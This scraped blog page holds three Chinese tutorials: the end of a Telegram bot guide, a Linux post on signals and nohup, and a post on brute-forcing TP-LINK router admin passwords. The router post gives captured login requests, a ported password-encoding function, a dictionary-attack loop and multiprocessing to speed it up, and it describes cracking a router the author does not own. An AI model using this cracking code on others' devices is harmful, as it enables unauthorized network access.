<h2 id="格式化与正在输入的特效"><a href="#格式化与正在输入的特效" class="headerlink" title="格式化与正在输入的特效"></a>格式化与正在输入的特效</h2><p>有些时候，我们想让消息有加粗、斜体等效果，其实这是非常简单的，只需要在send_message时指定parse_mode即可。Telegram支持Markdown与HTML两种模式，具体的信息就<a target="_blank" rel="noopener" href="https://core.telegram.org/bots/api#sendmessage">参考官方文档</a>吧。</p>
<p>如果想加入“正在输入”的特效，那就更简单了，使用send_action就可以了。示例代码如下：</p>
<p>bot.send_chat_action(message.chat.id, ‘typing’)<br>bot.send_message(message.chat.id, ‘这个是_斜体_哦’, parse_mode&#x3D;’Markdown’)<br>bot.send_chat_action(message.chat.id, ‘record_video’)<br>bot.send_message(message.chat.id, “`print(‘hello world’)`“, parse_mode&#x3D;’Markdown’)</p>
<p><img src="/images/2018020105134580.png"></p>
<h2 id="操作数据库"><a href="#操作数据库" class="headerlink" title="操作数据库"></a>操作数据库</h2><p>Python支持很多很多数据库，对于关系型数据库来说，大部分库的设计都是遵循<a target="_blank" rel="noopener" href="https://www.python.org/dev/peps/pep-0249/">PEP 249 Python Database API Specification</a>，所以咱的使用往往就是确定用哪种库，更改连接字符串，其他的基本不用改变太多。</p>
<p>Python内建sqlite的支持，所以在机器人这类应用中，用sqlite是非常方便的。</p>
<p>sqlite的使用方法也很简单，基本遵循如下步骤：</p>
<p>import sqlite3</p>
<h1 id="使用内存型数据库，实际应用时应该指定文件路径"><a href="#使用内存型数据库，实际应用时应该指定文件路径" class="headerlink" title="使用内存型数据库，实际应用时应该指定文件路径"></a>使用内存型数据库，实际应用时应该指定文件路径</h1><p>con &#x3D; sqlite3.connect(‘:memory:’)</p>
<h1 id="创建游标"><a href="#创建游标" class="headerlink" title="创建游标"></a>创建游标</h1><p>cur &#x3D; con.cursor()<br>create_table &#x3D; ‘’’CREATE TABLE IF NOT EXISTS job(<br>date DATETIME,<br>done TINYINT)<br>‘’’</p>
<h1 id="执行查询"><a href="#执行查询" class="headerlink" title="执行查询"></a>执行查询</h1><p>cur.execute(create_table)</p>
<h1 id="提交事务，否则不会写入数据库"><a href="#提交事务，否则不会写入数据库" class="headerlink" title="提交事务，否则不会写入数据库"></a>提交事务，否则不会写入数据库</h1><p>con.commit()</p>
<h1 id="关闭连接"><a href="#关闭连接" class="headerlink" title="关闭连接"></a>关闭连接</h1><p>con.close()</p>
<h3 id="防止注入的正确姿势"><a href="#防止注入的正确姿势" class="headerlink" title="防止注入的正确姿势"></a>防止注入的正确姿势</h3><p>首先需要知道的是，拼接SQL命令是不可以的，这样很容易<a target="_blank" rel="noopener" href="https://dmesg.app/school-6.html#title-9">导致注入</a>。：Python不像PHP、Java等存在名为PreparedStatement这类用法，Python防止注入的方法比较奇特，很简单，给<code>cur.execute()</code>传入占位符和参数列表就可以了，具体来说（对于sqlite而言）：</p>
<p>cursor.execute(“SELECT spam FROM eggs WHERE lumberjack &#x3D; ?”, (lumberjack,))</p>
<p>对于MySQL而言，使用%s作为占位符（管他啥类型的数据，数字还是什么的，用%s就对了）</p>
<p>cursor.execute(“SELECT spam FROM eggs WHERE lumberjack &#x3D; %s”, (lumberjack,))</p>
<p>更多详细信息可以参考<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/7929364/python-best-practice-and-securest-to-connect-to-mysql-and-execute-queries">StackOverflow: Python best practice and securest to connect to MySQL and execute queries</a></p>
<h2 id="集成requests库并解析json"><a href="#集成requests库并解析json" class="headerlink" title="集成requests库并解析json"></a>集成requests库并解析json</h2><p>Requests 唯一的一个非转基因的 Python HTTP 库，人类可以安全享用。</p>
<p>[v_error]警告：非专业使用其他 HTTP 库会导致危险的副作用，包括：安全缺陷症、冗余代码症、重新发明轮子症、啃文档症、抑郁、头疼、甚至死亡。[&#x2F;v_error]</p>
<p>现如今<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%85%B7%E8%B1%A1%E7%8A%B6%E6%80%81%E4%BC%A0%E8%BE%93">REST API</a>非常流行。REST API说白了就是使用各种HTTP请求（GET，POST，PUT啊什么的），返回某种资源（大部分情况下是json），所以用requests是非常好的选择。</p>
<p>而<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/JSON">json</a>格式与Python的字典基本相同，简直是不要太方便。</p>
<p>requests的使用方法非常简单，差不多就是三行代码的事：</p>
<p>import requests<br>r &#x3D; requests.get(‘<a target="_blank" rel="noopener" href="https://www.google.com/ncr">https://www.google.com/ncr</a>‘)<br>print r.text</p>
<p>如果需要POST方法，就把get换成post，如果需要更改headers等，就写作<code>r = requests.get(&#39;https://www.google.com/ncr&#39;, headers=&#123;&#39;User-Agent&#39;: &#39;Mozilla&#39;, &#125;)</code></p>
<p>更多的高级用法还是参考<a target="_blank" rel="noopener" href="http://docs.python-requests.org/zh_CN/latest/index.html">requests的官方手册</a>吧</p>
<p>不如试试接入淘宝IP库，实现一个查IP地址的机器人吧？（当然了，这只是一段示例代码，其实还是有些bug的啦……）</p>
<p>@bot.message_handler(commands&#x3D;[‘start’])<br>def edit_message(message):<br>    if len(message.text.split(‘ ‘)) !&#x3D; 2:<br>        bot.send_chat_action(message.chat.id, ‘typing’)<br>        bot.send_message(message.chat.id, ‘参数错误’)<br>    else:<br>        location &#x3D; get_location(message.text.split(‘ ‘)[1])<br>        bot.send_chat_action(message.chat.id, ‘typing’)<br>        bot.send_message(message.chat.id, u”你查询的IP地址：`%s`\n%s” % (message.text.split(‘ ‘)[1], location),parse_mode&#x3D;’Markdown’)</p>
<p>def get_location(ip):<br>    r &#x3D; requests.get(‘<a target="_blank" rel="noopener" href="http://ip.taobao.com/service/getIpInfo.php?ip=">http://ip.taobao.com/service/getIpInfo.php?ip=</a>‘ + ip).text<br>    res &#x3D; json.loads(r)<br>    if res.get(‘code’) &#x3D;&#x3D; 0:<br>        return res.get(‘data’).get(‘region’) + res.get(‘data’).get(‘country’) + res.get(‘data’).get(‘isp’)<br>    else:<br>        return ‘请求失败’</p>
<p><img src="/images/2018020105134576.png"></p>
<p>大概就是这么几行……</p>
<p>今天的教程就到这里了。本篇文章涉及到的代码可以在这里获取：</p>
<p>[gt href&#x3D;’<a target="_blank" rel="noopener" href="https://github.com/BennyThink/tools/tree/master/tgbot'/]%E5%BC%80%E6%BA%90%E5%9C%B0%E5%9D%80/[/gt/]">https://github.com/BennyThink/tools/tree/master/tgbot&#39;\]开源地址\[/gt\]</a></p>
<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>说太多也难以表达我的心情，可能已经彻底失去希望了吧。</p>
<blockquote>
<p>梁惠王曰：“寡人之于国也，尽心焉耳矣。河内凶，则移其民于河东，移其粟于河内。河东凶亦然。察邻国之政，无如寡人之用心者。邻国之民不加少，寡人之民不加多，何也？”</p>
<p>孟子对曰：“王好战，请以战喻。填然鼓之，兵刃既接，弃甲曳兵而走。或百步而后止，或五十步而后止。以五十步笑百步，则何如？”</p>
<p>曰：“不可，直不百步耳，是亦走也。”</p>
<p>曰：“王如知此，则无望民之多于邻国也。不违农时，谷不可胜食也；数罟不入洿池，鱼鳖不可胜食也；斧斤以时入山林，材木不可胜用也。谷与鱼鳖不可胜食，材木不可胜用，是使民养生丧死无憾也。养生丧死无憾，王道之始也。五亩之宅，树之以桑，五十者可以衣帛矣；鸡豚狗彘之畜，无失其时，七十者可以食肉矣；百亩之田，勿夺其时，数口之家可以无饥矣；谨庠序之教，申之以孝悌之义，颁白者不负戴于道路矣。七十者衣帛食肉，黎民不饥不寒，然而不王者，未之有也。</p>
<p>狗彘食人食而不知检，涂有饿莩而不知发；<strong>人死，则曰：‘非我也，岁也。’是何异于刺人而杀之，曰：‘非我也，兵也。’</strong>王无罪岁，斯天下之民至焉。”</p>
</blockquote>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2018/02/01/tgbot1/index/" data-id="clhp7rtm3009os2qr2610gaqa" data-title="[Telegram bot 系列]1：requests库、Inline Keyboard、Reply Keyboard与其他细节" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-python-bfa-router/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2017/12/28/python-bfa-router/index/" class="article-date">
  <time class="dt-published" datetime="2017-12-28T00:00:00.000Z" itemprop="datePublished">2017-12-28</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/justsay/">justsay</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2017/12/28/python-bfa-router/index/">使用python暴力破解路由器管理密码</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>[v_error]警告：此文可能存在一些破坏性或违反当地法律法规的内容，还可能会玩脱，仅供学习参考，请各位自行斟酌。 另外，如果能够物理接触到路由器，直接抓PPPoE拨号密码就好了[&#x2F;v_error]</p>
<p>自从实习以来，我一直苦恼于一个问题：桥接的房东家路由器，但是一直不知道路由器的管理密码。其实这也不算啥，不知道就不知道呗。直到某一天去某童鞋家，但是就是连不上Wi-Fi，看着挂在墙上的路由器，我就起了邪念……插网线，拿MR12U桥接。但是啊但是啊……咱是不是要进管理里看一下WPA2-PSK究竟是什么！</p>
<p>我目前只遇到了两种类型的路由器，咱就先来爽一把。</p>
<p>工欲善其事，必先利其器。那我们自然要有wireshark，还有postman啊，当然了，没有python解释器也是不行的，啊对你还得有个路由器ε&#x3D;ε&#x3D;ε&#x3D;┏(゜ロ゜;)┛但是你要是真没有路由器，那就拿Flask写一个简单的REST API吧，也是可以的（但是这还有什么用呢）。</p>
<p>其实在写这篇文章之前，我是很尴尬的……</p>
<p><img src="/images/2017122803165758.png"></p>
<p><a target="_blank" rel="noopener" href="https://twitter.com/BennyThinks/status/944944017267081217">推特小剧场</a></p>
<h2 id="路由器管理页面登录方式"><a href="#路由器管理页面登录方式" class="headerlink" title="路由器管理页面登录方式"></a>路由器管理页面登录方式</h2><p>我目前见过两种，还有一种就是像openwrt那种……暂时没有环境测试，不玩。</p>
<h3 id="传统型"><a href="#传统型" class="headerlink" title="传统型"></a>传统型</h3><p>大概是这样，需要你输入用户名密码：</p>
<p><img src="/images/2017122803165983.png"></p>
<h3 id="新型"><a href="#新型" class="headerlink" title="新型"></a>新型</h3><p><img src="/images/2017122803170045.png"></p>
<p>我当然是喜欢传统型的啊，为啥，多了个用户名，猜不中用户名有啥用嘛，哈哈哈哈。</p>
<h2 id="抓包之旅：传统型"><a href="#抓包之旅：传统型" class="headerlink" title="抓包之旅：传统型"></a>抓包之旅：传统型</h2><p>所以嘛，什么都不用想，打开wireshark抓包，然后追踪HTTP流，能得到如下的请求报文：</p>
<p>GET &#x2F; HTTP&#x2F;1.1<br>Host: 192.168.7.1<br>Connection: keep-alive<br>Authorization: Basic xxxxx<br>User-Agent: Mozilla&#x2F;5.0 (Windows NT 6.2; WOW64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;63.0.3075.92 Safari&#x2F;537.36 OPR&#x2F;46.0.2218.234<br>Upgrade-Insecure-Requests: 1<br>Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8</p>
<p>DNT: 1<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q&#x3D;0.9,en-US;q&#x3D;0.8,en;q&#x3D;0.7<br>Cookie: shellInABox&#x3D;3:101010</p>
<p>所以咱们大概是懂了，发现这家伙是登录是get请求带个Authorization的头，内容是Basic base64编码的信息，其中base64编码的是<strong>用户名:密码</strong>，那咱抄起postman就开始……</p>
<p><img src="/images/2017122803170225.png"></p>
<p>既然用postman已经成功登录了，那就没太大问题。</p>
<h2 id="抓包之旅：新型"><a href="#抓包之旅：新型" class="headerlink" title="抓包之旅：新型"></a>抓包之旅：新型</h2><p>这个866N嘛，首先管理页面右键没有用，开控制台发现是JS渲染的，再一看发现不是传统的表单提交的，估计是用的AJAX吧。抓包过滤http的post请求，大概能发现这么奇特的请求：</p>
<p><img src="/images/2017122803170458.png"></p>
<p>看这样子是点击确定按钮之后，用ajax方式提交了一个json。咱在报文上右键，追踪流-HTTP流，看一下完整的响应：</p>
<p>POST &#x2F; HTTP&#x2F;1.1<br>Host: 192.168.1.1<br>Connection: keep-alive<br>Content-Length: 54<br>Accept: application&#x2F;json, text&#x2F;javascript, *&#x2F;*; q&#x3D;0.01<br>Origin: <a target="_blank" rel="noopener" href="http://192.168.1.1/">http://192.168.1.1</a><br>X-Requested-With: XMLHttpRequest<br>User-Agent: Mozilla&#x2F;5.0 (Macintosh; U; Intel Mac OS X 10.9; rv:56.0) Gecko&#x2F;20100101 Firefox&#x2F;56.0<br>Content-Type: application&#x2F;json; charset&#x3D;UTF-8</p>
<p>DNT: 1<br>Referer: <a target="_blank" rel="noopener" href="http://192.168.1.1/">http://192.168.1.1/</a><br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q&#x3D;0.9,en-US;q&#x3D;0.8,en;q&#x3D;0.7</p>
<p>{“method”:”do”,”login”:{“password”:”0KcgeXhc9TefbwK”}}HTTP&#x2F;1.1 200 OK<br>Content-Type: text&#x2F;html;charset&#x3D;UTF-8<br>Content-Length: 75<br>Connection: close<br>Access-Control-Allow-Origin: *<br>Cache-control: no-cache<br>{“error_code”:0, “stok”:”%7EAjzwZP%2E%2EFD%5B0Z%7C46Z4PPP%28LQPu4%28kD%28”}</p>
<p>也就是说是提交了<code>&#123;&quot;method&quot;:&quot;do&quot;,&quot;login&quot;:&#123;&quot;password&quot;:&quot;0KcgeXhc9TefbwK&quot;&#125;&#125;</code>这样一个json，很明显那个0K什么的就是密码了，用postman提交一下试试，咋提交呢？headers设置成<code>application/json</code>，然后body里写raw，设置json，不出意外的话，你会得到一个error code 0</p>
<p><img src="/images/2017122803170544.png"></p>
<p>但是吧，<code>0KcgeXhc9TefbwK</code>这究竟是个啥，估计是在浏览器这里用JS加密了的密码吧，那咱就看JS然后溯源……？</p>
<p>还好<a target="_blank" rel="noopener" href="http://blog.csdn.net/dev_here/article/details/51235324">已经有人分析过了</a>，并且给出了C#版本的代码，咱只要port到Python就好啦。</p>
<p>[v_warn]小提示：我曾经在一篇博文中讨论过究竟是客户端加密还是服务端加密，我给出的观点是，至少要进行服务端加密。因为客户端加密是完全可以被重放攻击的。就这个例子来说，假如是有人通过中间人劫持的方式抓到了这个json，那么他就可以重放这个json来登录，尽管他依旧不知道密码。当然了，你都客户端加密了，自然加密用的密钥可能会被发现，然后被逆向。[&#x2F;v_warn]</p>
<h2 id="一种另类的模拟登录的办法"><a href="#一种另类的模拟登录的办法" class="headerlink" title="一种另类的模拟登录的办法"></a>一种另类的模拟登录的办法</h2><p>在正经的用requests库之前，我想到了一种另类的模拟登录的办法，比如说上面的这段JS我要是没逆向出来，那么就只好这么了，这种方法叫做……<a target="_blank" rel="noopener" href="https://selenium-python.readthedocs.io/">selenium</a></p>
<p>from selenium import webdriver</p>
<p>driver &#x3D; webdriver.Chrome()<br>driver.get(‘<a target="_blank" rel="noopener" href="http://192.168.1.1/">http://192.168.1.1</a>‘)<br>driver.find_element_by_xpath(‘&#x2F;&#x2F;*[@id&#x3D;”lgPwd”]‘).send_keys(‘123456’)<br>driver.find_element_by_xpath(‘&#x2F;&#x2F;*[@id&#x3D;”loginSub”]‘).click()</p>
<p>当然了你还需要写几行代码判断是否登录成功，咱还可以把Chrome换成<a target="_blank" rel="noopener" href="http://phantomjs.org/">PhantomJS</a>，只不过嘛，嘿嘿嘿，这个速度，估计要几秒钟才能尝试一个密码，效率太低啦。</p>
<h2 id="传统路由器用Python模拟登录"><a href="#传统路由器用Python模拟登录" class="headerlink" title="传统路由器用Python模拟登录"></a>传统路由器用Python模拟登录</h2><p>既然我们已经用postman搞成功了，那么就上requests库试试吧。代码很简单，就几行，简单的测试下：</p>
<p>import requests<br>r&#x3D;requests.get(‘<a target="_blank" rel="noopener" href="http://192.168.7.1/">http://192.168.7.1</a>‘, headers&#x3D;{‘Authorization’: ‘Basic QxxxxI2’})<br>print r.status_code</p>
<p>如果<code>status_code</code>为200的话，那么就是登录成功了。</p>
<h2 id="新型路由器用Python模拟登录"><a href="#新型路由器用Python模拟登录" class="headerlink" title="新型路由器用Python模拟登录"></a>新型路由器用Python模拟登录</h2><p>不要害怕，我已经帮你逆向好了客户端加密的那段代码，所以总体来说大概就是这么两个函数（好吧感觉缩进乱了）：当然啦，能够把JavaScript代码移植到Python也很不容易的，这是没有混淆、比较简单易懂的那种的，要是复杂的话，直接用<a target="_blank" rel="noopener" href="https://github.com/doloopwhile/PyExecJS">PyExecJS</a>吧（可惜<a target="_blank" rel="noopener" href="https://gist.github.com/doloopwhile/8c6ec7dd4703e8a44e559411cb2ea221">停止维护</a>了）</p>
<p>def security_encode(b):<br>    a &#x3D; ‘RDpbLfCPsJZ7fiv’<br>    c &#x3D; ‘yLwVl0zKqws7LgKPRQ84Mdt708T1qQ3Ha7xv3H7NyU84p21BriUWBU43odz3iP4rBL3cD02KZciXTysVXiV8ngg6vL48rPJyAUw0HurW20xqxv9aYb4M9wK1Ae0wlro510qXeU07kV57fQMc8L6aLgMLwygtc0F10a0Dg70TOoouyFhdysuRMO51yY5ZlOZZLEal1h0t9YQW0Ko7oBwmCAHoic4HYbUyVeU3sfQ1xtXcPcf1aT303wAQhv66qzW’</p>
<pre><code>e = &#39;&#39;
g = len(a)
h = len(b)
k = len(c)

f = g if g &gt; h else h
for p in range(f):
    n = l = 187
    if p &gt;= g:
        n = ord(b\[p\])
    elif p &gt;= h:
        l = ord(a\[p\])
    else:
        l = ord(a\[p\])
        n = ord(b\[p\])
    e += c\[((l ^ n) % k)\]
return e
</code></pre>
<p>def login(password):<br>    requests.get(‘<a target="_blank" rel="noopener" href="http://192.168.1.1/">http://192.168.1.1</a>‘, headers&#x3D;{‘Content-Type’: ‘application&#x2F;json’})<br>    r &#x3D; requests.post(‘<a target="_blank" rel="noopener" href="http://192.168.1.1/">http://192.168.1.1</a>‘, json&#x3D;{“method”: “do”, “login”: {“password”: security_encode(password)}})<br>    return r.status_code</p>
<p>同上，<code>status_code</code>为200，就意味着密码正确啦。</p>
<h2 id="开始暴力破解：集成弱口令字典"><a href="#开始暴力破解：集成弱口令字典" class="headerlink" title="开始暴力破解：集成弱口令字典"></a>开始暴力破解：集成弱口令字典</h2><p>当然了，实际暴力破解的时候，咱不可能一个一个输入密码，所以咱要使用弱口令字典。为了演示方便，我就随意编辑了一个比较简单的、长度比较短的弱口令字典，咱封装一下就好啦。想要真正的弱口令字典吗？自己搜索去吧~</p>
<p>def new_crack():<br>    with open(‘test_pass.txt’, ‘r’) as f:<br>        while True:<br>            line &#x3D; f.readline()<br>            if len(line) &#x3D;&#x3D; 0:<br>                break<br>            else:<br>                result, msg &#x3D; new_login(line.rstrip(‘\n’))<br>                if result:<br>                    return msg</p>
<p>至于传统登录的，还需要一份用户名文件，双重循环并注意seek即可。</p>
<h2 id="封装，封装"><a href="#封装，封装" class="headerlink" title="封装，封装"></a>封装，封装</h2><p>在完成了基本的测试之后，基本上就剩下封装函数、引入库、进行测试这些基本操作了，详细的代码就不贴了，可以戳下面的章鱼猫获取。其实这代码还可以更灵活的，那么就交给读者们了！ [gt href&#x3D;’<a target="_blank" rel="noopener" href="https://github.com/BennyThink/tools/tree/master/router/_crack'/]%E9%A1%B9%E7%9B%AE%E5%9C%B0%E5%9D%80/[/gt/]">https://github.com/BennyThink/tools/tree/master/router\_crack&#39;\]项目地址\[/gt\]</a></p>
<h2 id="加快破解速度"><a href="#加快破解速度" class="headerlink" title="加快破解速度"></a>加快破解速度</h2><p>俗话说，欲速则不达，呸，我才不管这些呢。我要加快破解程序的破解速度，我这一跑，也就占用20%不到的CPU，速度太慢了。那么……多线程？呃，Python里的多线程由于<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/zh-hans/%E5%85%A8%E5%B1%80%E8%A7%A3%E9%87%8A%E5%99%A8%E9%94%81">GIL锁</a>的存在，这多线程有时接近个摆设（就是说，无法发挥多核CPU的全部性能，当然如果不是CPU密集型的任务，遇到I&#x2F;O操作会释放锁，用多线程还是可以并发的）……那么我们只能上多进程了…省事，跑满CPU…另外，评论区仙子指出，连接复用也是一个好办法。</p>
<p> </p>
<p>那我们只需要在密码那里开个进程池，把任务全都丢给进程池，然后一起<code>join</code>就可以了。详细的代码可以参考下面的章鱼猫。 [gt href&#x3D;’<a target="_blank" rel="noopener" href="https://github.com/BennyThink/tools/blob/master/router/_crack/multiprocess/_old/_crack.py'/]%E5%A4%9A%E8%BF%9B%E7%A8%8B%E7%A4%BA%E4%BE%8B%E5%9C%B0%E5%9D%80/[/gt/]">https://github.com/BennyThink/tools/blob/master/router\_crack/multiprocess\_old\_crack.py&#39;\]多进程示例地址\[/gt\]</a></p>
<p>当然了，为了防止反复调用<code>p.get()</code>影响多进程效率，我稍微做了一点点改动。</p>
<p><img src="/images/2017122803170796.png"></p>
<p>这是一颗满载的CPU……</p>
<h2 id="最后的结果……"><a href="#最后的结果……" class="headerlink" title="最后的结果……"></a>最后的结果……</h2><p><img src="/images/2017122803170958.png"></p>
<p>我还能说什么，TP-LINK这绝对是脑子进水了。客户端加密的时候我就说你有毛病了，这连自己都进不去管理页面逼我重启路由器，真是……行吧，我打算逆向固件了。下次见。啊对，有个工具叫<a target="_blank" rel="noopener" href="https://github.com/vanhauser-thc/thc-hydra">THC Hydra</a>，也可以试试哦！</p>
<h2 id="哦对了"><a href="#哦对了" class="headerlink" title="哦对了"></a>哦对了</h2><p>提前祝愿小伙伴们元旦快乐！</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2017/12/28/python-bfa-router/index/" data-id="clhp7rtic006xs2qr2dp0e5zm" data-title="使用python暴力破解路由器管理密码" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-linux-keep-running/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2017/12/07/linux-keep-running/index/" class="article-date">
  <time class="dt-published" datetime="2017-12-07T00:00:00.000Z" itemprop="datePublished">2017-12-07</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/linux/">linux</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2017/12/07/linux-keep-running/index/">Linux怎么让程序持续运行：简单说说几种好玩的办法</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>这段时间，有小伙伴问我，怎么能让程序在关掉ssh之后还能继续运行？我简单的的说了一句开个screen吧。</p>
<p>实际上呢，在这之后还是有一些比较深奥的原理的，咱就扯扯。</p>
<h2 id="不得不的说的SSH"><a href="#不得不的说的SSH" class="headerlink" title="不得不的说的SSH"></a>不得不的说的SSH</h2><p>用Windows的远程桌面的时候，咱可能有这种感受：把远程桌面断开了，里面的程序也欢快的跑着ε&#x3D;ε&#x3D;ε&#x3D;(<del>￣▽￣)</del>但是在Linux我们把ssh连接断开，正在跑的程序却会立刻挂掉。这是为啥捏<del>(￣▽￣)</del>*</p>
<p>话说，咱连接到服务器，都是有sshd这个服务来负责的；连接成功之后，sshd会启动bash，之后咱在运行的命令什么的，相当于bash来帮我们启动。</p>
<p>此时的进程树大概是这么样子的：</p>
<p>init-&gt;sshd-&gt;bash-&gt;some_program</p>
<p>通过<code>pstree</code>可以大概看到进程树的结构</p>
<p><img src="/images/2017120708053786.png"></p>
<p>不能继续讲了，因为此时我们要说信号量！</p>
<h2 id="信号量"><a href="#信号量" class="headerlink" title="信号量"></a>信号量</h2><p>在不远的过去，有一门课叫《操作系统》，有一个章节叫信号量，有一个哥们叫<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E8%89%BE%E5%85%B9%E8%B5%AB%E5%B0%94%C2%B7%E6%88%B4%E5%85%8B%E6%96%AF%E7%89%B9%E6%8B%89">迪杰斯特拉</a>我一直管他叫迪杰特斯拉（爱迪生：说好的你爱我呢）</p>
<p>噗，跑题了。</p>
<p>话说在Linux下，咱是如何停止某个程序运行的呢？Ctrl+C，没错，但是只有前台进程才会体验到。</p>
<p>通常来说，咱会使用kill来结束某个进程。kill命令会给进程发送一个信号，然后由进程来处理（捕获）这个信号。这就好像是医生跟你说，你可以死了，然后你就选择……自杀吗&#x2F;(ㄒoㄒ)&#x2F;~~</p>
<p>kill用法很简单，简单点，一个PID；复杂点，一个signal，一个PID。</p>
<p>也就是说，你想杀掉PID为1087的进程，温柔点就<code>kill 1087</code>好了。</p>
<p>默认来说，kill会发送SIGTERM这个信号。</p>
<p>使用<code>kill -l</code>可以列出来所有的信号：</p>
<p><img src="/images/2017120708053951.png"></p>
<p>通常有这么几个信号是比较常用的、应该被记住的：</p>
<blockquote>
<p>1 - SIGHUP：挂起信号，当终端连接断开时就会发送这个信号；</p>
<p>2 - SIGINT：中断信号，也就是按Ctrl+C；</p>
<p>9 - SIGKILL：最强大的信号，相当于爆头击杀，不能被捕获；进程收到这个信号就会立刻拜拜；</p>
<p>15 - SIGTERM：终止信号，kill默认发送的信号，这就是告诉进程尽可能的终止，咱得跟进程爸爸一个告别儿女收拾善后的一个机会嘛；</p>
<p>19 - SIGSTOP：中断进程，也不能被捕获。咱别看这里写的是STOP，实际上是暂停的意思啦，等同于Ctrl+Z。用18号就恢复了~</p>
</blockquote>
<p>这话说的太抽象了，咱不如写个bash脚本来体验一下这几个信号量吧。</p>
<p>#!&#x2F;bin&#x2F;bash<br>trap “” INT<br>sleep 10</p>
<p>这代码不能再简单了。运行这个脚本，然后按Ctrl+C，咱会发现这程序并不退出， <img src="/images/2017120708054170.png"> </p>
<p>因为INT被捕获并忽略啦。 [v_tips]备注： 其实bash的坑很多，比如说，trap啥时候运行？咱以上的直觉可能是，接收到对应的信号，trap就会立刻做出相应与处理。其实不是的. 实际上，bash的行为比较特殊。当按下 CTRL-C 之后，它会向当前的整个进程组发出 SIGINT 信号。而 sleep 是由当前脚本调用的，是这个脚本的子进程（<code>/bin/sleep</code>）。 如果当前正有一个外部命令（<code>/bin/sleep</code>）在前台执行，那么 trap 会等待当前命令结束以后再处理信号队列中的信号。也就是trap要等sleep执行完才会捕捉到了信号。[&#x2F;v_tips]</p>
<h2 id="前台后台与作业控制"><a href="#前台后台与作业控制" class="headerlink" title="前台后台与作业控制"></a>前台后台与作业控制</h2><p>正常咱们的程序是跑在前台的，如果想跑到后台，那么命令结尾加个<code>&amp;</code>就好了。</p>
<p>比如说<code>bash demo.sh&amp;</code>那就被丢到后台去执行了，执行完成会弹出来告诉我们done</p>
<p><img src="/images/2017120708054281.png"></p>
<p>把正在运行的暂停并丢到后台，那就Ctrl+Z；查看作业列表，就用<code>jobs</code>；拿回前台就用<code>fg</code>；把暂停的继续运行就用<code>bg</code>……</p>
<p>不知道大家懂了没，哈哈哈哈。</p>
<h2 id="连接断开时"><a href="#连接断开时" class="headerlink" title="连接断开时"></a>连接断开时</h2><p>首先咱要知道，挂断信号（SIGHUP）默认的动作是终止程序。</p>
<p>那父进程要是先被终止、退出了，子进程会怎么样？一般来说有两种：</p>
<ol>
<li>过继（收养）给init，孤儿进程</li>
<li>被划为孤儿进程组，SIGHUP杀死</li>
</ol>
<p>[v_blue]小提示： 孤儿进程是先死了爹的进程，可能会有继父（init），也可能被归入进程组然后被SIGHUP杀死； 那要是子进程先死了呢？自然子进程会先把资源释放，然后父进程会给收尸（调用wait），然后内核回收进程控制块（PCB）。假如父进程因为种种原因没调用wait那么子进程的PCB仍然保存在系统中，就成为了僵尸进程。放心，kill 9是杀不掉僵尸进程的，遇到僵尸进程就杀死对应的父进程，然后init就会成为僵尸进程的爹，之后wait回收。[&#x2F;v_blue] 简单的说，sshd发现连接断开之后，bash收到SIGHUP信号从而关闭其所有子进程。(注意，bash的行为比较诡异，如果是输入exit，那就不会发送SIGHUP，也就是说你exit退出的，那么脚本还是欢快的跑下去的)</p>
<p>所以自然终端断了，大家都被SIGHUP干掉了呗~SIGHUP是元凶啊！ [v_notice] 一点点小实验： 让我们连到服务器，然后<code>systemctl stop sshd.service</code>，然后惊奇的发现当前终端还活着。想想这是为什么？后面我会说的…… 好了赶紧启动吧，要不当前连接挂了那就不好玩了。[&#x2F;v_notice]</p>
<h2 id="保持程序可靠运行的几种方法"><a href="#保持程序可靠运行的几种方法" class="headerlink" title="保持程序可靠运行的几种方法"></a>保持程序可靠运行的几种方法</h2><p>既然咱都知道是因为SIGHUP关闭的了，那咱让程序忽略这个信号不就好了嘛！</p>
<h3 id="几种不好用的办法"><a href="#几种不好用的办法" class="headerlink" title="几种不好用的办法"></a>几种不好用的办法</h3><p>比如说<code>&amp;</code>，Ctrl+Z，这都是不好用的……照样还是处于一个session中，还是sshd-&gt;bash-&gt;program，还是会收到SIGHUP然后拜拜。</p>
<h2 id="nohup"><a href="#nohup" class="headerlink" title="nohup"></a>nohup</h2><p>SIGHUP是元凶，那么<code>nohup</code>就好了。</p>
<p>比如说：</p>
<p>nohup ping z.cn</p>
<p>这样程序的输出会被重定向到<code>nohup.out</code>中，更通常我们会<code>nohup ping z.cn &amp;</code>顺便给丢到后台，此时进程树还是init-&gt;sshd-&gt;bash-&gt;ping，如果我们关闭终端，那么<code>ping</code>就会成为孤儿进程，然后过继给init，此时我们<code>pstree</code>一下会发现变为init-&gt;ping了</p>
<p><img src="/images/201712070805442.png"></p>
